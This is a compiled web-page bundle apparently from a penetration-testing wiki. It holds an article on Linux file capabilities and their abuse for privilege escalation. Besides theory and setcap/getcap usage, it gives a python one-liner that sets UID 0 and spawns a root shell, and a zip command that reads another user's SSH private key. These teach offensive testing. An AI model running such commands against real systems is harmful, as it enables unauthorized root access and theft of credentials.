import{_ as a,c as e,a5 as s,o as t}from"./chunks/framework.B5CpDqM0.js";const k=JSON.parse('{"title":"üõ†Ô∏è Capabilities","description":"","frontmatter":{"authors":"ShutdownRepo, p0dalirius"},"headers":[],"relativePath":"infra/privilege-escalation/unix/capabilities.md","filePath":"infra/privilege-escalation/unix/capabilities.md","lastUpdated":1724982529000}'),l={name:"infra/privilege-escalation/unix/capabilities.md"};function n(p,i,r,d,h,o){return t(),e("div",null,i[0]||(i[0]=[s(`<h1 id="üõ†Ô∏è-capabilities" tabindex="-1">üõ†Ô∏è Capabilities <a class="header-anchor" href="#üõ†Ô∏è-capabilities" aria-label="Permalink to &quot;üõ†Ô∏è Capabilities&quot;">‚Äã</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">‚Äã</a></h2><p>Linux capabilities are a way to improve permission granularity in unix-like systems. It allows to follow the least-privilege principle by defining fine-grained permissions that can be attributed to threads and files. It works by splitting kernel calls in groups of similar functionalities.</p><p>Basic processes : Have no capabilities (file access is controlled by traditional file privileges).</p><p>(Binary) files : Can have capabilities (filesystem-dependent).</p><p>Capabilities are in separated in 5 sets :</p><table tabindex="0"><thead><tr><th>Set</th><th>Description</th></tr></thead><tbody><tr><td>Effective set</td><td>the set that will be used when doing permission check.</td></tr><tr><td>Permitted set</td><td>can be moved to effective set by calling <code>capset()</code></td></tr><tr><td>Inheritable set</td><td>can be inherited from parent processes, can be moved to effective set by calling <code>capset()</code></td></tr><tr><td>Bounding set</td><td>list of all the capabilities a process can ever receive (in its inheritable/permitted sets)</td></tr><tr><td>Ambiant set</td><td>passed to non-suid files without defined capabilities</td></tr></tbody></table><h4 id="capability-inheritance-capability-drop" tabindex="-1">Capability inheritance, capability drop <a class="header-anchor" href="#capability-inheritance-capability-drop" aria-label="Permalink to &quot;Capability inheritance, capability drop&quot;">‚Äã</a></h4><ul><li>On <code>fork()</code> call, the child thread will have the same capabilities as the parent thread.</li><li><code>capset()</code> syscall allows to</li><li>drop any capability from any set</li><li>move capabilities from permitted/inherited sets to effective set</li><li>If a thread calls <code>execve()</code> on a binary file, its capabilities will be modified following the pattern described in the man pages (see <code>man capabilities</code>).</li></ul><p>Non-exhaustive capability list :</p><table tabindex="0"><thead><tr><th>Capability</th><th>Description</th></tr></thead><tbody><tr><td><code>CAP_AUDIT_CONTROL</code></td><td>Toggle kernel auditing</td></tr><tr><td><code>CAP_AUDIT_WRITE</code></td><td>Write to kernel audit log</td></tr><tr><td><code>CAP_CHOWN</code></td><td>Change file owners</td></tr><tr><td><code>CAP_SETUID/CAP_SETGID</code></td><td>Change UID/GID</td></tr><tr><td><code>CAP_NET_RAW</code></td><td>Open raw and packet sockets</td></tr><tr><td><code>CAP_NET_BIND_SERVICE</code></td><td>Bind a socket to Internet domain privileged ports</td></tr></tbody></table><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">‚Äã</a></h2><p>Setting a file&#39;s capabilities :</p><p>To change capabilities on a file, you need to type these commands as <code>root</code> :</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># set capability to change uid to file (+ep to add to effective &amp; permitted)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">setcap</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cap_setuid+ep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /path/to/file</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># delete capabilites </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">setcap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /path/to/file</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># get file(s) capabilities</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">getcap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> dir</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> 2&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/dev/null</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">getcap</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> file</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># listing &amp; decoding a running process&#39; capabilities</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Cap</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /proc/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$pid</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/status</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">capsh</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --decode=000001ffffffffff</span></span></code></pre></div><p>Exploiting capabilities :</p><ul><li>Empty capabilities</li></ul><p>If a file has capabilities <code>/path/to/file =ep</code> it means it has <code>all</code> capabilities <em>and</em> will run as <code>root</code>.</p><div class="tip custom-block"><p>To create a file with empty (=all) capabilities just<code>sudo setcap \\=ep /path/to/file</code></p></div><p>Other classic examples :</p><ul><li>If the <code>python</code> binary has the <code>cap_setuid</code> then it becomes trivial to get a root shell :</li></ul><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">./python</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -c</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;import os; os.setuid(0); os.system(&#39;/bin/sh&#39;)&quot;</span></span></code></pre></div><ul><li>Arbitrary file read : <code>zip</code> with <code>cap_dac_read_search</code></li></ul><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># cap_dac_read_search allows zip/tar to read any file (get ssh private key here)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">zip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/private_k.zip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ~/.ssh/id_rsa</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">unzip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/private_k.zip</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># id_rsa is now readable in the unzipped folder</span></span></code></pre></div><p>End notes :</p><p>When copied from one place to another, a binary will lose its capabilities. In order to keep capabilities, you can copy the file with <code>--preserve=all</code> option :</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># to keep capabilities when copying a binary</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --preserve=all</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /origin/path</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /dest/path</span></span></code></pre></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">‚Äã</a></h2><p><a href="https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work" target="_blank" rel="noreferrer">https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work</a></p><p><a href="https://blog.ploetzli.ch/2014/understanding-linux-capabilities/" target="_blank" rel="noreferrer">https://blog.ploetzli.ch/2014/understanding-linux-capabilities/</a></p><p><a href="https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/" target="_blank" rel="noreferrer">https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/</a></p>`,31)]))}const b=a(l,[["render",n]]);export{k as __pageData,b as default};
